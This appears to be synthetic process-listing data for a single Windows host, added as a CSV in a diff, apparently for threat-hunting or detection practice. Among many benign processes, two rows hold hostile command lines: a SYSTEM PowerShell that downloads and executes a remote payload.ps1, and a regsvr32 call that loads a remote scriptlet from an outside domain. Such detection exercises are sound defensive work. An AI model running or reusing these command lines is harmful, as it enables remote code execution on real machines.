@@ -1,0 +1,57 @@
+hostname,name,arguments,username,path,pid
+WL496WUG,CCleaner64.exe,"""C:\Program Files\CCleaner\CCleaner.exe"" /uac",georgi.howard1,C:\Program Files\CCleaner,5223
+WL496WUG,CCleaner64.exe,"""C:\Program Files\CCleaner\CCleaner.exe"" /uac",georgi.howard1,C:\Program Files\CCleaner,4075
+WL496WUG,kitty-0.70.0.6.exe,"""C:\Users\joseph.roger\Documents\kitty-0.70.0.6.exe"" ",joseph.roger,C:\Users\joseph.roger\Documents,5555
+WL496WUG,wmiprvse.exe,C:\Windows\system32\wbem\wmiprvse.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32\wbem,4876
+WL496WUG,McInstruTrack.exe,C:\ProgramData\McAfee\McInstruTrack\McInstruTrack.exe /SP:0,aust.edward42,C:\ProgramData\McAfee\McInstruTrack,4189
+WL496WUG,msdtc.exe,C:\Windows\System32\msdtc.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,548
+WL496WUG,dwm.exe,"""dwm.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,1916
+WL496WUG,winlogon.exe,winlogon.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,1136
+WL496WUG,OneDrive.exe,"""C:\Users\georgi.howard1\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" ",georgi.howard1,C:\Users\georgi.howard1\AppData\Local\Microsoft\OneDrive,6245
+WL496WUG,ModuleCoreService.exe,ModuleCoreService.exe /startUserModeHosting=4_TIME_TO_DIE,aust.edward42,c:\program files\common files\mcafee\modulecore,1395
+WL496WUG,McDiReg.exe,C:\ProgramData\McAfee\Direct\McDiReg.exe -MONITOR_PI2 9508,aust.edward42,C:\ProgramData\McAfee\Direct,2134
+WL496WUG,svchost.exe,C:\Windows\system32\svchost.exe -k RPCSS,NT AUTHORITY\SYSTEM,C:\Windows\system32,472
+WL496WUG,McAMTaskAgent.exe,"""C:\Program Files\Common Files\McAfee\TaskScheduler\McAMTaskAgent.exe"" -Embedding",aust.edward42,C:\Program Files\Common Files\McAfee\TaskScheduler,5734
+WL496WUG,ProtectedModuleHost.exe,"""C:\\Program Files\\Common Files\\McAfee\ModuleCore\\ProtectedModuleHost.exe""",aust.edward42,C:\Program Files\Common Files\McAfee\ModuleCore,2038
+WL496WUG,PEFService.exe,"""C:\Program Files\Common Files\McAfee\PEF\CORE\PEFService.exe""",aust.edward42,C:\Program Files\Common Files\McAfee\PEF\CORE,2468
+WL496WUG,dwm.exe,"""dwm.exe""",NT AUTHORITY\SYSTEM,C:\Windows\system32,4308
+WL496WUG,powershell.exe,"-exec bypass -c ""(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://webserver/payload.ps1')|iex""",NT AUTHORITY\SYSTEM,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,280
+WL496WUG,UIHost.exe,"""C:\Program Files\McAfee\WebAdvisor\UIHost.exe"" ",aust.edward42,C:\Program Files\McAfee\WebAdvisor,5943
+WL496WUG,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -service",joseph.roger,C:\Program Files\TightVNC,2182
+WL496WUG,MMSSHOST.EXE,"""C:\Program Files\Common Files\McAfee\MMSSHost\MMSSHOST.EXE"" MMSCOM homenetsvc",aust.edward42,C:\Program Files\Common Files\McAfee\MMSSHost,3185
+WL496WUG,svchost.exe,C:\Windows\system32\svchost.exe -k NetworkService,NT AUTHORITY\SYSTEM,C:\Windows\system32,1308
+WL496WUG,ServiceHost.exe,"""C:\Program Files\McAfee\WebAdvisor\ServiceHost.exe""",aust.edward42,C:\Program Files\McAfee\WebAdvisor,5411
+WL496WUG,svchost.exe,C:\Windows\system32\svchost.exe -k NetworkServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\system32,2168
+WL496WUG,mcafee_trial_setup_433.0207.3919_key.exe,"""C:\Users\aust.edward42\AppData\Local\Temp\scoped_dir9616_4071\mcafee_trial_setup_433.0207.3919_key.exe"" ",aust.edward42,C:\Users\aust.edward42\AppData\Local\Temp\scoped_dir9616_4071,4839
+WL496WUG,modulecoreservice.exe,"""c:\program files\common files\mcafee\modulecore\modulecoreservice.exe""",aust.edward42,c:\program files\common files\mcafee\modulecore,942
+WL496WUG,mchost.exe,"""C:\Program Files\Common Files\McAfee\Platform\Core\mchost.exe"" {e05dd3fd-ba47-4235-85a5-3789db83c8e1} /pid=444",aust.edward42,C:\Program Files\Common Files\McAfee\Platform\Core,1487
+WL496WUG,spoolsv.exe,C:\Windows\System32\spoolsv.exe,NT AUTHORITY\SYSTEM,C:\Windows\System32,780
+WL496WUG,svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch,NT AUTHORITY\SYSTEM,C:\Windows\system32,3928
+WL496WUG,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" ",georgi.howard1,C:\Windows\System32\WindowsPowerShell\v1.0,3561
+WL496WUG,mcuicnt.exe,"""C:\Program Files\Common Files\mcafee\Platform\mcuicnt.exe"" ""C:\Program Files\Common Files\McAfee\ActWiz\mcactwiz.dll"" nosplash:",aust.edward42,C:\Program Files\Common Files\mcafee\Platform,5600
+WL496WUG,LogonUI.exe,"""LogonUI.exe"" /flags:0x0",NT AUTHORITY\SYSTEM,C:\Windows\system32,4424
+WL496WUG,wininit.exe,wininit.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,5960
+WL496WUG,CCleaner64.exe,"""C:\Program Files\CCleaner\CCleaner.exe"" /MONITOR /uac",georgi.howard1,C:\Program Files\CCleaner,1547
+WL496WUG,regsvr32.exe,C:\Windows\System32\regsvr32 /u /n /s /i:\\granthamsgt.com\AdInProcess.sct scrobj.dll,georgi.howard1,C:\Windows\System32\regsvr32.exe,5696
+WL496WUG,MFEAvSvc.exe,"""C:\Program Files\McAfee\MfeAV\MFEAvSvc.exe""",aust.edward42,C:\Program Files\McAfee\MfeAV,4638
+WL496WUG,McDiReg.exe,"""C:\ProgramData\McAfee\Direct\McDiReg.exe"" ",aust.edward42,C:\ProgramData\McAfee\Direct,2159
+WL496WUG,svchost.exe,C:\Windows\System32\svchost.exe -k termsvcs,NT AUTHORITY\SYSTEM,C:\Windows\System32,2148
+WL496WUG,lsass.exe,C:\Windows\system32\lsass.exe,NT AUTHORITY\SYSTEM,C:\Windows\system32,6152
+WL496WUG,MicrosoftEdgeCP.exe,"""C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP.exe"" -ServerName:ContentProcess.AppX6z3cwk4fvgady6zya12j1cw28d228a7k.mca",aust.edward42,C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe,4315
+WL496WUG,svchost.exe,C:\Windows\system32\svchost.exe -k LocalService,NT AUTHORITY\SYSTEM,C:\Windows\system32,1580
+WL496WUG,svchost.exe,C:\Windows\system32\svchost.exe -k LocalServiceNoNetwork,NT AUTHORITY\SYSTEM,C:\Windows\system32,5736
+WL496WUG,notepad.exe,"""C:\Windows\system32\notepad.exe"" ",georgi.howard1,C:\Windows\system32,3992
+WL496WUG,svchost.exe,C:\Windows\System32\svchost.exe -k utcsvc,NT AUTHORITY\SYSTEM,C:\Windows\System32,5184
+WL496WUG,McPvTray.exe,"""C:\Program Files\McAfee\MAT\McPvTray.exe""",aust.edward42,C:\Program Files\McAfee\MAT,1717
+WL496WUG,svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,C:\Windows\system32,5336
+WL496WUG,tvnserver.exe,"""C:\Program Files\TightVNC\tvnserver.exe"" -controlservice -slave",joseph.roger,C:\Program Files\TightVNC,1853
+WL496WUG,svchost.exe,C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\System32,1756
+WL496WUG,Explorer.EXE,C:\Windows\Explorer.EXE,NT AUTHORITY\SYSTEM,C:\Windows,428
+WL496WUG,KeePassXC.exe,"""C:\Program Files\KeePassXC\KeePassXC.exe"" ",aust.edward42,C:\Program Files\KeePassXC,236
+WL496WUG,mcshield.exe,"""C:\Program Files\Common Files\McAfee\AMCore\mcshield.exe""",aust.edward42,C:\Program Files\Common Files\McAfee\AMCore,2969
+WL496WUG,McCSPServiceHost.exe,"""C:\Program Files\Common Files\McAfee\CSP\3.0.127.0\\McCSPServiceHost.exe""",aust.edward42,C:\Program Files\Common Files\McAfee\CSP\3.0.127.0,249
+WL496WUG,CCleaner64.exe,"""C:\Program Files\CCleaner\CCleaner.exe"" /MONITOR /uac",georgi.howard1,C:\Program Files\CCleaner,6022
+WL496WUG,taskhostex.exe,taskhostex.exe ,NT AUTHORITY\SYSTEM,C:\Windows\system32,1360
+WL496WUG,svchost.exe,C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted,NT AUTHORITY\SYSTEM,C:\Windows\System32,444
+WL496WUG,vncviewer.exe,"""C:\Program Files\RealVNC\VNC Viewer\vncviewer.exe"" ",joseph.roger,C:\Program Files\RealVNC\VNC Viewer,3410
+WL496WUG,McApExe.exe,"""C:\Program Files\Common Files\McAfee\VSCore_18_6\McApExe.exe""",aust.edward42,C:\Program Files\Common Files\McAfee\VSCore_18_6,1823
